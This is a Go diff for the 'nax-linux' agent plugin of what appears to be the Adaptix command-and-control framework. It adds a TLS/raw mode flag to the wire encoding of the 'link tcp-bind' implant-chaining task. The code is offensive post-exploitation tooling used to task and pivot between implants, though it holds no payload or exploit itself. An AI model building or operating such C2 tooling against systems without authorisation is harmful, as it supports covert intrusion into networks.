@@ -393,6 +393,7 @@ func CreateCommand(agentData adaptix.AgentData, args map[string]any) (adaptix.Ta
 	case "link":
 		switch subcommand {
 		case "tcp-bind":
+			mode, _ := args["mode"].(string)
 			target, _ := args["target"].(string)
 			portVal, _ := args["port"].(float64)
 			port := uint16(portVal)
@@ -400,17 +401,25 @@ func CreateCommand(agentData adaptix.AgentData, args map[string]any) (adaptix.Ta
 				return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
 					fmt.Errorf("nax-linux: link tcp-bind: 'target' and 'port' required")
 			}
+			useTLS := byte(1) // default: TLS (NaxDarks Linux)
+			if mode == "raw" {
+				useTLS = 0
+			}
 			targetBytes := []byte(target)
-			argsLen := 1 + 2 + 4 + len(targetBytes)
+			// wire: [link_type(1)][use_tls(1)][port(2LE)][ip_len(4LE)][ip_bytes]
+			argsLen := 1 + 1 + 2 + 4 + len(targetBytes)
 			data := make([]byte, 5+argsLen)
 			data[0] = CMD_LINK
 			binary.LittleEndian.PutUint32(data[1:5], uint32(argsLen))
-			data[5] = 2
-			binary.LittleEndian.PutUint16(data[6:8], port)
-			binary.LittleEndian.PutUint32(data[8:12], uint32(len(targetBytes)))
-			copy(data[12:], targetBytes)
+			data[5] = 2       // link_type = tcp-bind
+			data[6] = useTLS  // 1=TLS, 0=raw
+			binary.LittleEndian.PutUint16(data[7:9], port)
+			binary.LittleEndian.PutUint32(data[9:13], uint32(len(targetBytes)))
+			copy(data[13:], targetBytes)
 			task := adaptix.TaskData{Type: adaptix.TASK_TYPE_TASK, Data: data, Sync: true}
-			msg := adaptix.ConsoleMessageData{Status: adaptix.MESSAGE_INFO, Message: fmt.Sprintf("link tcp-bind %s:%d queued", target, port)}
+			modeLabel := "tls"
+			if useTLS == 0 { modeLabel = "raw" }
+			msg := adaptix.ConsoleMessageData{Status: adaptix.MESSAGE_INFO, Message: fmt.Sprintf("link tcp-bind %s:%d queued (mode=%s)", target, port, modeLabel)}
 			return task, msg, nil
 		default:
 			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
